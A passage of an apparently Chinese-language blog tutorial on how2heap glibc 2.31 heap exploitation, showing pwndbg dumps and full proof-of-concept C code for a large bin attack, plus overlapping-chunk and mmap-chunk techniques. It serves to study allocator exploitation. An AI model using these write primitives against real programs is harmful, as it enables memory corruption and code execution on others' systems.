class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span> &lt;------ bk-&gt;nextsize</span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p &amp;target</span><br><span class="line">$<span class="number">14</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7fffffffe280</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx &amp;target<span class="number">-2</span></span><br><span class="line"><span class="number">0x7fffffffe260</span>:<span class="number">0x00007fffffffe2c0</span><span class="number">0x0000555555555140</span></span><br><span class="line"><span class="number">0x7fffffffe270</span>:<span class="number">0x00007fffffffe3b0</span><span class="number">0x00005555555554a4</span></span><br><span class="line"><span class="number">0x7fffffffe280</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555555592a0</span></span><br><span class="line"><span class="number">0x7fffffffe290</span>:<span class="number">0x00005555555596d0</span><span class="number">0x00005555555596f0</span></span><br><span class="line"><span class="number">0x7fffffffe2a0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559b30</span></span><br></pre></td></tr></table></figure><p>然后我们再 malloc 一个比 p2 大 chunk （此时 p2 在 unsortedbin 里），那么此时，就会将 p2 从 unsortedbin 取出，insert  largebins 里，那么就存在如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code>   —- &gt; <code> p1-&gt;fd_nextsize = p2-&gt;fd</code></p><p><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize</code>   ——&gt; <code>p1-&gt;bk_nextsize = p2-&gt;fd-&gt;bk_next_size</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x5555555596e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x5555555596f0</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559700</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559720</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x7ffff7fb0be0</span> &lt;main_arena+<span class="number">96</span>&gt;:<span class="number">0x0000555555559f60</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fb0bf0</span> &lt;main_arena+<span class="number">112</span>&gt;:<span class="number">0x00005555555596e0</span><span class="number">0x00005555555596e0</span></span><br></pre></td></tr></table></figure><p>这样就成功在 target 目标写入 p2-&gt;fd-&gt;bk_next_size 的值，即 0x00005555555596e0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x target</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x5555555596e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>通常而言，这种写大数的行为，我们可以用来修改 <em>global_max_fast</em></p><p>完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h3><p>通过修改 size 造成堆重叠，然后拿到两个指针指向同一个 chunk</p><p>构造如下 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x80</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559310</span>      <span class="number">0x3131313131313131</span>  <span class="number">0x500</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559810</span>      <span class="number">0x3232323232323232</span>  <span class="number">0x80</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>p1 是 大小 0x80 的chunk， p2 是大小为 0x500 的chunk ，p3 是大小为 0x80 的chuk</p><p>然后修改 p2 的大小 为 p2 +p 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">44</span> <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">► <span class="number">45</span> *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">  <span class="number">46</span> <span class="comment">/* VULNERABILITY */</span></span><br></pre></td></tr></table></figure><p>再然后释放 p2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">48</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">► <span class="number">49</span> <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="number">50</span> <span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>再分配一个新的 大小符合修改之后的  chunk， 可以把 修改完 chunk 之后的 p2+p3 重新分配回来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">56</span> p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"> ► <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">   <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">   <span class="number">60</span> <span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line">   <span class="number">61</span></span><br><span class="line">   <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">   <span class="number">63</span>    <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffe280 —▸ 0x7fffffffe3b8 —▸ 0x7fffffffe633 ◂— &#x27;/media/psf/Home/Downloads/how2heap/glibc_2.31/overlapping_chunks&#x27;</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe288</span> ◂— <span class="number">0x15555556d</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe290</span> —▸ <span class="number">0x7ffff7fb5fc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe298</span> ◂— <span class="number">0x57800000581</span></span><br><span class="line">04:0020│      0x7fffffffe2a0 —▸ 0x5555555592a0 ◂— 0x3131313131313131 (&#x27;11111111&#x27;)</span><br><span class="line">05:0028│      0x7fffffffe2a8 —▸ 0x555555559320 ◂— 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">06:0030│      0x7fffffffe2b0 —▸ 0x555555559820 ◂— 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">07:0038│      0x7fffffffe2b8 —▸ 0x555555559320 ◂— 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">555555555390</span> main+<span class="number">359</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p p4+evil_region_size</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555bee0</span></span><br><span class="line">pwndbg&gt; p p3+<span class="number">0x580</span><span class="number">-8</span></span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555c3e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们就会发现 p4 和 p3 重叠了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope p3</span><br><span class="line">00:0000│ rax rdi  0x555555559820 ◂— 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope p4</span><br><span class="line">00:0000│   0x555555559320 ◂— 0x3434343434343434 (&#x27;44444444&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; hexdump <span class="number">0x555555559320</span> <span class="number">0x400</span></span><br><span class="line">+<span class="number">0000</span> <span class="number">0x555555559320</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">+<span class="number">0020</span> <span class="number">0x555555559720</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0120</span> <span class="number">0x555555559820</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  │<span class="number">3333</span>│<span class="number">3333</span>│<span class="number">3333</span>│<span class="number">3333</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0170</span> <span class="number">0x555555559870</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0190</span> <span class="number">0x555555559890</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">71</span> <span class="number">07</span> <span class="number">02</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │<span class="number">4444</span>│<span class="number">4444</span>│q...│....│</span><br><span class="line">+<span class="number">01</span>a0 <span class="number">0x5555555598a0</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h3><pre><code>    GLibC中的Mmap chunks入门知识    ==================================在GLibC中，有一个点，当一个分配是如此之大，以至于malloc决定我们需要一个单独的内存部分来处理它，而不是在正常的堆上分配它。这是由 mmap_threshold var.代替正常的获取块的逻辑，系统调用 Mmap。这将分配一段虚拟内存，并把它还给用户。同样，释放过程也会有所不同。释放的块不是还给一个bin或堆的其他部分，而是使用另一个syscall。*Munmap*. 它接收一个先前分配的Mmap块的指针，并将其释放回内核。Mmap chunks在大小元数据上有一个特殊的位：第二位。如果这个位被设置，那么这个块就被分配为一个Mmap块。Mmap分块有一个prev_size和一个size。大小*代表当前的 分块的大小。一个chunk的*prev_size*表示剩余的空间。的大小（不是直接低于大小的分块）。然而，fd和bk指针并没有被使用，因为Mmap chunks并没有返回到 的大小，就像GLibC Malloc中的大多数堆块一样。释放后， 分块必须是页面对齐的。下面的POC本质上是一个重叠的chunk攻击，但在mmap chunks上。这和https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c 非常相似。主要的区别是，mmapped chunks有特殊的属性，并且是 以不同的方式处理，创造出与正常情况下不同的攻击场景。重叠的分块攻击。还可以做其他的事情。如munmapping系统库、堆本身和其他东西。这只是一个简单的概念证明，目的是为了证明一般的 的方法来执行对 mmap 分块的攻击。 关于GLibC中mmap chunks的更多信息，请阅读这篇文章。http://tukan.farm/2016/07/27/munmap-madness/</code></pre><p>首先使用 malloc 分配几个大的 chunk :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">57</span> <span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line">  <span class="number">59</span></span><br><span class="line">  <span 